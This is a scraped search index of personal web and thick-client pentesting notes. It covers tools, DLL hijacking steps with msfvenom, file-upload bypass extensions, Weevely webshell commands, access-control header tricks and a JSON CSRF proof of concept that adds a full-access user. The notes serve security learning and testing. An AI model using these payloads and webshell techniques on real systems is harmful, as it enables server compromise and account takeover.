Portfolio Github</p>","tags":["thick client applications","thick client applications pentesting","checklist"]},{"location":"thick-applications/tools-for-thick-apps/","title":"Tools for pentesting thick client applications","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#decompilation-tools","title":"Decompilation tools","text":"<ul> <li>C++ decompilation: https://ghidra-sre.org</li> <li>C# decompilation: dnspy.</li> <li>JetBrains dotPeek.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#read-app-metadata","title":"Read app metadata","text":"<ul> <li>CFF explorer. Open the app with CFF  Explorer to see which language and tool was used for its creation.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#sniff-connections","title":"Sniff connections","text":"<ul> <li>TCP View from sysInternalsSuite.</li> <li>Wireshark.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#traffic-monitoring","title":"Traffic monitoring","text":"<ul> <li>wireshark, it's ok if we just want to monitor. </li> <li>Echo mirage, very old and not maintained.</li> <li>mitm_relay + BurpSuite.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#static-analysis","title":"Static analysis","text":"","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#spot-hard-coded-credentials","title":"Spot hard coded credentials","text":"<ul> <li>Strings from  sysInternalsSuite. It's similar to the command \"strings\" in bash. It displays all the human readable strings in a binary.</li> <li>dnspy can be used to spot functions containing hard coded credentials (for connections,...).</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#log-analysis","title":"Log analysis","text":"<p>When debug mode is on, you can run:</p> <p><pre><code>thick-app-name.exe &gt; path/to/logs.txt\n</code></pre> Open the file with the logs of the application and, if you are lucky and debug mode is still on, you will be able to see some stuff such as SQL queries, decrypted database passwords, users, temp location of the ftp file...</p>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#dynamic-analysis","title":"Dynamic analysis","text":"","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#changes-in-the-file-system","title":"Changes in the file system","text":"<ul> <li>ProcessMonitor tool from sysInternalsSuite to see changes in the file system. For instance, you can analyze the access to interesting files in the application directory in real time.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#spot-sensitive-data-in-registry-entries","title":"Spot sensitive data in Registry entries","text":"<ul> <li>ProcessMonitor tool from sysInternalsSuite to spot changes in the Registry Entries.  </li> <li>regshot allows you to compare two snapshots of registry entries (before opening the application and during executing the application).</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#check-the-memory","title":"Check the memory","text":"<p>Process Hacker tool During a  a connection to database the code  that does it may be in clear text or encrypted. If encrypted, it's still possible to find it in memory. Process Hacker tool dumps the memory of the process so we might find the clear text connection string  in memory.</p>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#scan-the-application","title":"Scan the application","text":"<p>Visual Code grepper.</p>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#attacks","title":"Attacks","text":"","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#dll-hickjacking","title":"DLL Hickjacking","text":"<p>Step by step. </p> <p>1. Locate interesting DLL files with ProcessMonitor (or ProcMon).</p> <p>2. Craft  malicious DLL  with msfvenom from attacker machine.</p> <p>3. Serve it to the victime machine using an apache server.</p> <p>4. Placing the file in the same directory from where is going to be called.</p> <p>5. Run the app.</p>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#reversing-net-applications","title":"Reversing .NET applications","text":"<ul> <li>dnspy: c# code + IL code + patching the application</li> <li>dotPeek (from JetBrains)</li> <li>ILspy / Reflexil</li> <li>ILASM (IL Assembler) (comes with .NET Framework).</li> <li>ILDASM (IL Disassembler) (comes with Visual Studio).</li> </ul> <p>How to do it?</p>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#input-sanitization-sql-injections","title":"Input sanitization: SQL injections","text":"<p>Manually</p>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#application-signing","title":"Application Signing","text":"<p>Sigcheck, from SysInternals Suite (more).</p>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"thick-applications/tools-for-thick-apps/#compiler-protection","title":"Compiler protection","text":"<p>Binscope.</p> <p>PESecurity  is a powershell script that checks if a Windows binary (EXE/DLL) has been compiled with ASLR, DEP, SafeSEH, StrongNaming, Authenticode, Control Flow Guard, and HighEntropyVA.</p> <p>Also, check these other tools and resources:</p> <ul> <li>WinSpy.</li> <li>Window Detective</li> <li>netspi.com.</li> </ul>","tags":["thick client applications","thick client applications pentesting","tools"]},{"location":"webexploitation/","title":"Web exploitation guide","text":"<p>Public exploits</p> <p>We can use these resources: - searchsploit - ExploitDB. - Rapid7.com. - Vulnerability Lab. - metasploit: check verification scripts to test the existence of a vulnerability. </p> OWASP Attack Tools Payloads WSTG-INPV-12 Command injection attack <ul><li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection.</li> CRLF attack - Carriage Return and LineFeed attack <ul><li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection.</li> WSTG-SESS-05 CSRF attack - Cross Site Request Forgery attack BurpSuite, CSRFTester <ul><li>PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection.</li><li>OWASP: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</li><li>Portswigger: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</li><li>Unleashing an Ultimate XSS Polyglot: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot</li> Directory traversal attack LFI attack - Local File Inclusion attack Remote Code Execution RFD attack - Reflected File Download attack Reflected File Download Checker - Burp Extension RFI attack - Remote File Inclusion attack Session Puzzling XSS-Me SSRF attack - Server Side Request Forgery Burp Collaborator, Burp Intruder, manually Built-in lists in Burp WSTG-INPV-05 SQL injection Cheat sheet for manual attack, sqlmap Payloads from my dictionary repo XFS attack - Cross-frame Scripting attack WSTG-INPV-01 WSTG-INPV-02 WSTG-CLNT-01 XSS attack - Cross-Site Scripting attack beef,  XSSer, Easy-XSS, Manual testing, XSSMe tool on github <ul><li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</li> <li>https://github.com/payloadbox/xss-payload-list</li> <li>https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626</li> </ul>","tags":["pentesting","web","pentesting","exploitation"]},{"location":"webexploitation/arbitrary-file-upload/","title":"Arbitrary File Upload","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.8. Test Upload of Unexpected File Types </p> ID Link to Hackinglife Link to OWASP Description 10.8 WSTG-BUSL-08 Test Upload of Unexpected File Types - Review the project documentation for file types that are rejected by the system.  - Verify that the unwelcomed file types are rejected and handled safely. Also, check whether the website only check for \"Content-type\" or file extension.  - Verify that file batch uploads are secure and do not allow any bypass against the set security measures. 10.9 WSTG-BUSL-09 Test Upload of Malicious Files - Identify the file upload functionality.  - Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.  - If documentation is not available then consider what would be appropriate based on the purpose of the application.  - Determine how the uploaded files are processed.  - Obtain or create a set of malicious files for testing.  - Try to upload the malicious files to the application and determine whether it is accepted and processed. <p>An arbitrary file upload vulnerability is a type of security flaw in web applications that allows an attacker to upload and execute malicious files on a web server. This can have serious consequences, including unauthorized access to sensitive data, server compromise, and even complete system control. The vulnerability arises when the application fails to properly validate and secure the uploaded files. This means that the application may not check if the uploaded file is actually of the expected type (e.g., image, PDF), or it may not restrict the file's location or execution on the server.</p> <p>Exploitation: An attacker identifies the file upload functionality in the target  application and attempts to upload a malicious file. This file can be crafted to include malicious code, such as PHP scripts, shell commands, or malware.</p> <p>Bypassing Validation: If the application doesn't properly validate file types or restricts file locations, the attacker can upload a file with a misleading extension (e.g., uploading a PHP file with a .jpg extension).</p>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/arbitrary-file-upload/#bypass-file-upload-restrictions","title":"Bypass file upload restrictions","text":"<p>Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.</p>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/arbitrary-file-upload/#cheat-sheet-for-php","title":"Cheat sheet for php","text":"<p>Source: Repo from imran-parray OWASP deep explanation: link</p> <pre><code># try to upload a simple php file\nupload.php \n\n# To bypass the blacklist.\nupload.php.jpeg \n\n# To bypass the blacklist.\nupload.jpg.php\n#  and Then Change the content type of the file to image or jpeg.\nupload.php \n\n# version - 1 2 3 4 5 6 7\nupload.php*\n\n# To bypass The BlackList\nupload.PHP \nupload.PhP \nupload.pHp \n\n#  By uploading this [jpg,png] files can be executed as php with malicious code within it.\nupload .htaccess\n\n# To test againt the DOS.\npixelFlood.jpg\n\n#  upload gif file with 10^10 Frames\nframeflood.gif\n\n# upload UBER.jpg\nMalicious zTXT \n\n# Add backdoor in comments using Exiftool and \nupload.php [getimagesize() \n# rename the jpg file with php so that it will be execute. This Time The Verification of server is only limited to contents of the uploaded file not on the extension\n\n# backdoor in php chunks\nphppng.png \n\n# backdoor in php chunks \nxsspng.png \n</code></pre>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/arbitrary-file-upload/#execute-a-file-uploaded-as-an-image-in-nginx","title":"Execute a file uploaded as an image in nginx","text":"<p>After bypassing a file upload feature (using .jpg extension but php mimetype), the file is treated by the application as an image.</p> <p></p> <p>How to bypass that situation? This works in some versions of nginx server:</p> <pre><code># After the name of the file with the jpg extension, add slash and the name of the file with the uploaded and accepted mimetype php. After that you can use the CMD command of the webshell.\n\nhttps://example.com/uploads/lolo.jpg/lolo.php?cmd=pwd\n</code></pre> <p></p>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/arbitrary-file-upload/#tools","title":"Tools","text":"<p>Generate a php webshell with Weevely and saving it an image:</p> <pre><code>weevely generate secretpassword example.png \n</code></pre> <p>Upload it to the application.</p> <p></p> <p>Make the connection with weevely:</p> <pre><code>weevely https://example.com/uploads/example.jpg/example.php secretpassword\n</code></pre> <p></p>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/arbitrary-file-upload/#bypass-php-version-based-file-extension-filters-when-running-the-file","title":"Bypass PHP version-based file extension filters when running the file","text":"<p>Sometimes a web server may prevent some php files from running based on their php version. A way of bypassing this situation is indicating in the extension of the file, the version you want to upload. </p> <pre><code>shell.php7\n</code></pre> <p>In this case, the uploaded file could be executed in php v7. </p>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/broken-access-control/","title":"Broken access control","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.2. Testing for Bypassing Authorization Schema</p> ID Link to Hackinglife Link to OWASP Description 5.2 WSTG-ATHZ-02 Testing for Bypassing Authorization Schema - Assess if horizontal or vertical access is possible.  - Access to Administrative functions by force browsing (/admin/addUser) <p>Access control\u00a0determines whether the user is allowed to carry out the action that they are attempting to perform. In the context of web applications, access control is dependent on authentication and session management.</p> <ul> <li>Authentication\u00a0confirms that the user is who they say they are.</li> <li>Session management\u00a0identifies which subsequent HTTP requests are being made by that same user.</li> </ul> <p>Types of broken access control:</p> <ul> <li>Vertical access control: a regular user can access or perform operations on endpoints reserved to admins.</li> <li>Horizontal access control: a regular user can access resources or perform operations on other users. </li> <li>Context-dependent access control: Context-dependent access controls restrict access to functionality and resources based upon the state of the application or the user's interaction with it. For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment.</li> </ul>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#exploitation","title":"Exploitation","text":"<p>This is how you usually test these vulnerabilities:</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#unprotected-functionality","title":"Unprotected functionality","text":"<p>At its most basic, vertical privilege escalation arises where an application does not enforce any protection for sensitive functionality. Example: accessing /admin panel (or a less obvious url for the admin functionality.)</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#parameter-based-access-control-methods","title":"Parameter-based access control methods","text":"<p>When the application makes access control decisions based on a submitted value.</p> <pre><code>https://insecure-website.com/login/home.jsp?admin=true\n</code></pre> <p>This approach is insecure because a user can modify the value and access functionality they're not authorized to, such as administrative functions. In the following example, I'm the user wiener, but I can access to user carlos information by modifying the parameter id in the request:</p> <pre><code>GET /my-account?id=carlos HTTP/2\n</code></pre> <p>For GUID and obfuscated parameters, you can chain a data exposure vulnerability with this. Also, an IDOR.</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#url-override-methods","title":"URL override methods","text":"<p>There are\u00a0various non-standard HTTP headers that can be used to override the URL in the original request, such as\u00a0<code>X-Original-URL</code>\u00a0and\u00a0<code>X-Rewrite-URL</code>.</p> <p>If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then: </p> <pre><code>POST / HTTP/1.1\nHost: target.com\nX-Original-URL: /admin/deleteUser \n...\n</code></pre>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#url-matching-discrepancies","title":"URL-matching discrepancies","text":"<p>Websites can vary in how strictly they match the path of an incoming request to a defined endpoint. </p> <ul> <li>For example, they may tolerate inconsistent capitalization, so a request to\u00a0<code>/ADMIN/DELETEUSER</code>\u00a0may still be mapped to the\u00a0<code>/admin/deleteUser</code>\u00a0endpoint. If the access control mechanism is less tolerant, it may treat these as two different endpoints and fail to enforce the correct restrictions as a result.</li> <li>Spring framework with <code>useSuffixPatternMatch</code>\u00a0option enabled allows paths with an arbitrary file extension to be mapped to an equivalent endpoint with no file extension.</li> <li>On other systems, you may encounter discrepancies in whether\u00a0<code>/admin/deleteUser</code>\u00a0and\u00a0<code>/admin/deleteUser/</code></li> </ul>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#idors","title":"IDORS","text":"<p>IDORs occur if an application uses user-supplied input to access objects directly and an attacker can modify the input to obtain unauthorized access.</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#abusing-referer-request-header","title":"Abusing Referer Request header","text":"<p>The\u00a0<code>Referer</code>\u00a0header can be added to requests by browsers to indicate which page initiated a request.</p> <p>For example, an application robustly enforces access control over the main administrative page at\u00a0<code>/admin</code>, but for sub-pages such as\u00a0<code>/admin/deleteUser</code>\u00a0only inspects the\u00a0<code>Referer</code>\u00a0header. If the\u00a0<code>Referer</code>\u00a0header contains the main\u00a0<code>/admin</code>\u00a0URL, then the request is allowed.</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/broken-access-control/#other-headers-to-consider-for-location-base-control","title":"Other Headers to Consider for location-base control","text":"<p>Often admin panels or administrative related bits of functionality are only accessible to clients on local networks, therefore it may be possible to abuse various proxy or forwarding related HTTP headers to gain access. Some headers and values to test with are:</p> <ul> <li>Headers:<ul> <li><code>X-Forwarded-For</code></li> <li><code>X-Forward-For</code></li> <li><code>X-Remote-IP</code></li> <li><code>X-Originating-IP</code></li> <li><code>X-Remote-Addr</code></li> <li><code>X-Client-IP</code></li> </ul> </li> <li>Values<ul> <li><code>127.0.0.1</code>\u00a0(or anything in the\u00a0<code>127.0.0.0/8</code>\u00a0or\u00a0<code>::1/128</code>\u00a0address spaces)</li> <li><code>localhost</code></li> <li>Any\u00a0RFC1918\u00a0address:<ul> <li><code>10.0.0.0/8</code></li> <li><code>172.16.0.0/12</code></li> <li><code>192.168.0.0/16</code></li> </ul> </li> <li>Link local addresses:\u00a0<code>169.254.0.0/16</code></li> </ul> </li> </ul>","tags":["web pentesting","attack"]},{"location":"webexploitation/buffer-overflow/","title":"Buffer Overflow attack","text":"<p>A buffer is an area in the RAM (Random Access Memory) reserved for temporary data storage. If a developer does not enforce buffer\u2019s limits, an attacker could find a way to write data beyond those limits.</p> <p>A stack is a data structure used to store the data. Two approaches: LIFO and FIFO Two methods: push (adds elements to the stack) and pop (removes elements from the stack)</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/captcha-replay-attack/","title":"Captcha Replay attack","text":"<p>Captcha replay attack is a vulnerability in which the Captcha validation system accepts old Captcha values which have already expired.  This is sometimes considered legitimate behavior (as would be expected if the user refreshed the browser after submitting a successful captcha), however in many cases, such functionality would make the captcha significantly less effective at preventing automation. </p> <p>In this case, the attacker resubmitted a request that had already been successfully validated through a captcha, and \"replay\" was explicitly disabled for the captcha. This is not necessarily a malicious incident on its own, because the user can have accidentally refreshed the browser, however multiple attempts would definitely represent malicious intent.</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/carriage-return-and-linefeed-crlf/","title":"Carriage Return and Linefeed - CRLF Attack","text":"<p>Source: Owasp description: https://owasp.org/www-community/vulnerabilities/CRLF_Injection.</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/carriage-return-and-linefeed-crlf/#description","title":"Description","text":"<p>A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL. CRLF is the acronym used to refer to Carriage Return (\\r) Line Feed (\\n). As one might notice from the symbols in the brackets, \u201cCarriage Return\u201d refers to the end of a line, and \u201cLine Feed\u201d refers to the new line.</p> <p>The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). They\u2019re used to note the termination of a line, however, dealt with differently in today\u2019s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.</p>","tags":["web pentesting","attack"]},{"location":"webexploitation/carriage-return-and-linefeed-crlf/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> </ul>","tags":["web pentesting","attack"]},{"location":"webexploitation/cross-frame-scripting-xfs/","title":"XFS attack - Cross-frame Scripting","text":"","tags":["web pentesting","attack"]},{"location":"webexploitation/cross-frame-scripting-xfs/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> </ul>","tags":["web pentesting","attack"]},{"location":"webexploitation/cross-site-request-forgery-csrf/","title":"CSRF attack - Cross Site Request Forgery","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.5. Testing for Cross Site Request Forgery</p> ID Link to Hackinglife Link to OWASP Description 6.5 WSTG-SESS-05 Testing for Cross Site Request Forgery - Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.  - Conduct URL analysis, Direct access to functions without any token. <p>Cross Site Request Forgery (CSRF)  is a type of web security vulnerability that occurs when an attacker tricks a user into performing actions on a web application without their knowledge or consent. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application. </p> <p>CSRF vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of the request's origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application.</p> <p>Three conditions that enable CSRF:</p> <ul> <li>A relevant action.</li> <li>Cookie-based session handling.</li> <li>No unpredictable request parameters.</li> </ul>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#how-it-works","title":"How it works","text":"<pre><code>The attacker crafts a malicious request (e.g., changing the user's email address or password) and embeds it in a web page, email, or some other form of content.\n\nThe attacker lures the victim into loading this content while the victim is authenticated in the target web application.\n\nThe victim's browser automatically sends the malicious request, including the victim's authentication cookie.\n\nThe web application, trusting the request due to the authentication cookie, processes it, causing the victim's account to be compromised or modified.\n</code></pre> <p>CSRF attacks can have serious consequences: </p> <ul> <li>Unauthorized changes to a user's account settings.</li> <li>Fund transfers or actions on behalf of the user without their consent.</li> <li>Malicious actions like changing passwords, email addresses, or profile information.</li> </ul>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#how-to-test-csrf-by-using-burpsuite-proof-of-concept","title":"How to test CSRF by using Burpsuite proof of concept","text":"<p>Burp has a quite awesome PoC so you can generate HTML (and javascript) code to replicate this attack.</p> <ol> <li> <p>Select a URL or HTTP request anywhere within Burp, and choose Generate CSRF PoC within Engagement tools in the context menu.  </p> </li> <li> <p>You have two buttons: one for editing the request manually (Regenerate button) the HTML based on the updated request; and tje ptjer to test the effectiveness of the generated PoC in Burp's browser (Test in browser button).</p> </li> <li> <p>Open the crafted page from the same browser where the user has been logged in.</p> </li> <li> <p>Observe the result, i.e. check if the web server executed the request.</p> </li> </ol>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#fetch-api","title":"Fetch API","text":"<p>Requirements:</p> <ol> <li>Authentication Method should be cookie based only</li> <li>No Authentication Token in Header</li> <li>Same-Origin Policy should not be enforced</li> </ol> <p>Browser -&gt; Network tab in development tools, right click on request and copy as fetch:</p> <p></p>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#json-csrf","title":"Json CSRF","text":"<p>Resources: https://systemweakness.com/ways-to-exploit-json-csrf-simple-explanation-5e77c403ede6</p> <p>POC: source rootsploit.com</p> <pre><code># Change the URL and Body from the PoC file to perform the CSRF on JSON Endpoint.\n&lt;html&gt;\n&lt;title&gt;CSRF Exploit POC by RootSploit&lt;/title&gt;\n\n&lt;body&gt;\n    &lt;center&gt;\n        &lt;h1&gt; CSRF Exploit POC by RootSploit&lt;/h1&gt;\n\n        &lt;script&gt;\n            function JSON_CSRF() {\n                fetch('https://vuln.rootsploit.io/v1/addusers', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: '{\"user\":{\"role_id\":\"full_access\",\"first_name\":\"RootSploit\",\"last_name\":\"RootSploit\",\"email\":\"csrf-test@rootsploit.com\",\"password\":\"Password@\",\"confirm_password\":\"Password@\",\"mobile_number\":\"99999999999\"}}' });\n                window.location.href=\"https://rootsploit.com/csrf\"\n            }\n        &lt;/script&gt;\n\n        &lt;button onclick=\"JSON_CSRF()\"&gt;Exploit CSRF&lt;/button&gt;\n    &lt;/center&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#mitigation","title":"Mitigation","text":"<p>Cross-Site Request Forgery Prevention Cheat Sheet</p>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#related-labs","title":"Related labs","text":"<ul> <li>https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf</li> </ul>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#resources","title":"Resources","text":"<p>When it comes to web vulnerabilities, it is useful to have some links at hand:</p> <ul> <li>Owasp vuln description: https://owasp.org/www-community/attacks/csrf.</li> <li>Using Burp to Test for Cross-Site Request Forgery (CSRF): https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery.</li> <li>PoC with Burp, official link: https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc.</li> </ul>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-request-forgery-csrf/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> </ul>","tags":["web","pentesting","attack","HTTP","headers"]},{"location":"webexploitation/cross-site-scripting-xss/","title":"XSS attack - Cross-Site Scripting","text":"OWASP reference <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.2. Testing for Stored Cross Site Scripting</p> ID Link to Hackinglife Link to OWASP Description 7.1 WSTG-INPV-01 Testing for Reflected Cross Site Scripting - Identify variables that are reflected in responses.  - Assess the input they accept and the encoding that gets applied on return (if any). 7.2 WSTG-INPV-02 Testing for Stored Cross Site Scripting - Identify stored input that is reflected on the client-side.  - Assess the input they accept and the encoding that gets applied on return (if any). 11.1 WSTG-CLNT-01 Testing for DOM-Based Cross Site Scripting - Identify DOM sinks.  - Build payloads that pertain to every sink type. Sources for these notes <ul> <li>My Ine: eWPTv2.</li> <li>Hacktricks.</li> <li>HackTheBox Cross-Site Scripting module.</li> <li>XSS Filter Evasion Cheat Sheet\u00b6.</li> <li>OWASP: WSTG.</li> <li>Notes during the Cibersecurity Bootcamp at The Bridge.</li> <li>Experience pentesting applications.</li> </ul> <p>Cross-Site scripting (XSS) is a client-side web vulnerability that allows attackers to inject malicious scripts into web pages. This vulnerability is typically caused by a lack of input sanitization/validation in web applications. Attackers leverage XSS vulnerabilities to inject malicious code into web applications. Because XSS is a client side vulnerability, these scripts are executed by the victims browser. XSS vulnerabilities affect web applications that lack input validation and leverage client-side scripting languages like Javascript, Flash, CSS etc. </p> <p>There are many other types of XSS attacks, from Bitcoin mining to displaying ads. 2As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine (i.e., V8 in Chrome). They cannot execute system-wide JavaScript code to do something like system-level code execution.</p> <pre><code># Quick steps to test XSS \n# 1. Find a reflection point (inspect source code and expand all tags to make sure that it's really a reflection point and it's not parsing your input)\n# 2. Test with &lt;i&gt; tag\n# 3. Test with HTML/JavaScript code (alert('XSS'))\n</code></pre> <p>But, of course, you may use an extensive repository of payloads. This OWASP cheat sheet is kind of a bible.</p> <p>XSS attacks are typically exploited for the following objectives:</p> <ol> <li>Cookie stealing/Session hijacking - Stealing cookies from users with authenticated sessions, allowing you to login as other users by leveraging the authentication information contained within a cookie.</li> <li>Browser exploitation - Exploitation of browser vulnerabilities. </li> <li>Keylogging - Logging keyboard entries made by other users on a web application.</li> <li>Phishing - Injecting fake login forms into a webpage to capture credentials.</li> <li>... and many more.</li> </ol>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#types-of-cross-site-scripting-xss","title":"Types of Cross-Site Scripting XSS","text":"<p>1. Reflected attacks: malicious payload is carried inside the request that the browser sends. You need to bypass the anti-xss filters. This way when the victim clicks on it it will be sending their information to the attacker (limited to js events).  </p> <p>Example:</p> <pre><code>http://victim.site/seach.php?find=&lt;payload&gt;\n</code></pre> <p>2. Persistent or stored XSS attacks: payload is sent to the web server and then stored. The most common vector for these attacks are HTML forms that submit content to the web server and then display that content back to the users (comments, user profiles, forum posts\u2026). Basically if the url somehow stays in the server, then, every time that someone accesses to it, they will suffer the attack.</p> <p>3. DOM based XSS attacks: tricky one. This time the javascript file procedes from the server, and in that sense, the file is trusteable. Nevertheless, the file modifies changes in the web structure. Quoting OWASP: \"DOM Based XSS (or as it is called in some texts, \u201ctype-0 XSS\u201d) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM \u201cenvironment\u201d in the victim\u2019s browser used by the original client side script, so that the client side code runs in an unexpected manner\".</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#1-reflected-cross-site-scripting","title":"1. Reflected Cross Site Scripting","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.1. Testing for Reflected Cross Site Scripting</p> ID Link to Hackinglife Link to OWASP Description 7.1 WSTG-INPV-01 Testing for Reflected Cross Site Scripting - Identify variables that are reflected in responses.  - Assess the input they accept and the encoding that gets applied on return (if any). <p>Reflected\u00a0Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client.</p> <p>XSS Filter Evasion Cheat Sheet</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#causes","title":"Causes","text":"<p>This vulnerable PHP code in a welcome page may lead to an XSS attack:</p> <pre><code>&lt;?php $name = @$_GET['name']; ?&gt;\n\nWelcome &lt;?=$name?&gt;\n</code></pre>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#2-persistent-or-stored-cross-site-scripting","title":"2.  Persistent or stored Cross Site Scripting","text":"OWASP reference <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.2. Testing for Stored Cross Site Scripting</p> ID Link to Hackinglife Link to OWASP Description 7.2 WSTG-INPV-02 Testing for Stored Cross Site Scripting - Identify stored input that is reflected on the client-side.  - Assess the input they accept and the encoding that gets applied on return (if any). <p>Stored cross-site scripting is a vulnerability where an attacker is able to inject Javascript code into a web application\u2019s database or source code via an input that is not sanitized. For example, if an attacker is able to inject a malicious XSS payload in to a webpage on a website without proper sanitization, the XSS payload injected in to the webpage will be  executed by the browser of anyone that visits that webpage.</p>","tags":["web pentesting","attack","xss"]},{"location":"webexploitation/cross-site-scripting-xss/#causes_1","title":"Causes","text":"<p>This vulnerable PHP code in a welcome page may lead to a stored 